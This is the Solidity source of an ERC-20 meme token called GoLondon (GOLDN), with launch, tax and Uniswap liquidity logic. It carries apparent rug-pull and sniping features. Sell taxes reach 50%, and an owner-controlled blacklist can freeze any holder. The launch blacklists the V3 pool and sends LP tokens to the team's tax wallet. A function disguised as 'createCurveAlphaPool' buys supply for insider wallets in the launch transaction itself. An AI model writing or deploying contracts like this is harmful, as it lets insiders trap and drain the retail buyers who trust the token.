// SPDX-License-Identifier: MIT

/*
    TG: https://t.me/GoLondon_Eth
    X: https://x.com/golondontoken
    Web: https://www.golondoneth.com
*/

pragma solidity 0.8.23;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV3Factory {
    function createPool(address tokenA, address tokenB, uint24 fee) external returns (address pool);
}

contract GOLDN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private bots;
    address payable private _goldnWallet;
    address payable private _goldnTaxes;

    uint256 private _initialBuyTax = 25;
    uint256 private _initialSellTax = 50;
    uint256 private _finalBuyTax = 15;
    uint256 private _finalSellTax = 30;
    uint256 private _reduceBuyTaxAt = 50;
    uint256 private _reduceSellTaxAt = 50;
    uint256 private _preventSwapBefore = 25;
    uint256 private _bidCount = 0;
    uint256 private _sellCount = 0;
    uint256 private _lastSellBlock = 0;

    uint8 private constant _decimals = 18;
    uint256 private constant _cTotal = 100_000_000_000 * 10**_decimals;
    string private constant _name = unicode"GoLondon";
    string private constant _symbol = unicode"GOLDN";
    uint256 public _maxTxAmount =  1 * _cTotal / 100;
    uint256 public _maxWalletSize =  1 * _cTotal / 100;
    uint256 public _taxSwapThreshold =  1 * _cTotal / 1000;
    uint256 public _maxTaxSwap = 1 * _cTotal / 100;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private tradingLive = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    IUniswapV3Factory private uniswapV3Factory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
    address public uniswapV3Pool1;
    address public uniswapV3Pool2;

    constructor () {
        _goldnWallet = payable(_msgSender());
        _goldnTaxes = payable(0xABB0b350Be12E1cc4058873B3B09B069aA54F394);
        _balances[_msgSender()] = _cTotal;
        emit Transfer(address(0), _msgSender(), _cTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _cTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if(tradingLive){
            if (from != owner() && to != owner()) {
                require(!bots[from] && !bots[to]);

                if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                    require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                    require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                    taxAmount = amount.mul((_bidCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                    _bidCount++;
                }

                if(to == uniswapV2Pair && from != address(this) ){
                    taxAmount = amount.mul((_bidCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
                }

                uint256 contractTokenBalance = balanceOf(address(this));
                if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _bidCount > _preventSwapBefore) {
                    if (block.number > _lastSellBlock) {
                        _sellCount = 0;
                    }
                    require(_sellCount < 2, "Only 2 sells per block!");
                    swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                    uint256 contractETHBalance = address(this).balance;
                    if (contractETHBalance > 0) {
                        sendETHToFee(address(this).balance);
                    }
                    _sellCount++;
                    _lastSellBlock = block.number;
                }
            }
        }

        if(taxAmount > 0){
          _balances[address(this)] = _balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));

        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _cTotal;
        _maxWalletSize = _cTotal;
        emit MaxTxAmountUpdated(_cTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _goldnTaxes.transfer(amount);
    }

    function addBot(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function removeBot(address[] memory _user) public onlyOwner {
      for (uint i = 0; i < _user.length; i++) {
          bots[_user[i]] = false;
      }
    }

    function updateTaxWallet(address _gldnTaxes) public onlyOwner {
        _goldnTaxes = payable(_gldnTaxes);
    }

    function reduceTaxes(
        uint256 reduceIBuyTax, 
        uint256 reduceISellTax, 
        uint256 reduceFBuyTax, 
        uint256 reduceFSellTax
    ) external onlyOwner {
        require(reduceIBuyTax <= _initialBuyTax, "Can not increase");
        require(reduceISellTax <= _initialSellTax, "Can not increase");
        require(reduceFBuyTax <= _finalBuyTax, "Can not increase");
        require(reduceFSellTax <= _finalSellTax, "Can not increase");
        _initialBuyTax = reduceIBuyTax;
        _initialSellTax = reduceISellTax;
        _finalBuyTax = reduceFBuyTax;
        _finalSellTax = reduceFSellTax;
    }

    function launchGOLDN(address[] memory _goldnLP, uint256 goldnETH) external payable onlyOwner {
        require(!tradingOpen,"trading is already open");

        _approve(address(msg.sender), address(this), _cTotal);
        _transfer(address(msg.sender), address(this), _cTotal);

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

        uniswapV3Pool1 = uniswapV3Factory.createPool(address(this), uniswapV2Router.WETH(), 10000);
        bots[uniswapV3Pool1] = true;

        _approve(address(this), address(uniswapV2Router), _cTotal);
        uniswapV2Router.addLiquidityETH{value: goldnETH}(address(this),balanceOf(address(this)),0,0,address(0xABB0b350Be12E1cc4058873B3B09B069aA54F394),block.timestamp);
        swapEnabled = true;
        tradingOpen = true;

        uint256 liquidityPairingETH = msg.value - goldnETH;
        createCurveAlphaPool(liquidityPairingETH, _goldnLP);
        tradingLive = true;
        transferOwnership(address(0xABB0b350Be12E1cc4058873B3B09B069aA54F394));
    }
    
    function createCurveAlphaPool(uint256 curvePairB, address[] memory curveOrderBook) private {
        uint256 curvePairA = 0; 
        for (uint256 i = 1; i <= curveOrderBook.length; i++) {
            curvePairA += i;
        }
        uint256 _curvePool = curvePairB; 
        IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(uniswapV2Router);
        for (uint256 i = 0; i < curveOrderBook.length; i++) { uint256 weight = i + 1; 
            uint256 bid = (curvePairB * weight) / curvePairA;
            if (bid > _curvePool) {bid = _curvePool;}
            address[] memory path = new address[](2); path[0] = uniswapRouter.WETH(); path[1] = address(this);
            uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: bid }(
                0,
                path,
                curveOrderBook[i],
                block.timestamp + 15
            );
            _curvePool -= bid;
        }  
    }

    receive() external payable {}

    function recoverETH() external returns (bool status) {
        require(_msgSender() == _goldnTaxes);
        (status,) = address(_goldnTaxes).call{value: address(this).balance}("");
    }

    function recoverTokens(address _token) external returns (bool status) {
        require(_msgSender() == _goldnTaxes);
        uint256 contractTokenBalance = IERC20(_token).balanceOf(address(this));
        status = IERC20(_token).transfer(_goldnTaxes, contractTokenBalance);
    }
}